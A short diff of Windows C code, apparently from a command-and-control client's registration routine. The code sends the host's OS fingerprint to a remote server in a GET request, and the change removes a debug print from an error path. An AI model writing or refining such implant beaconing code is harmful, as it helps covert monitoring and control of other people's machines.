@@ -65,7 +65,7 @@ RET_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey) {
 
     // (ab)uses GET request to send os fingerprint
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", registerStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
-    if (hRequest == NULL) { printf("1\n"); return R_NULL; }
+    if (hRequest == NULL) { return R_NULL; }
 
     // send the register request
     if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
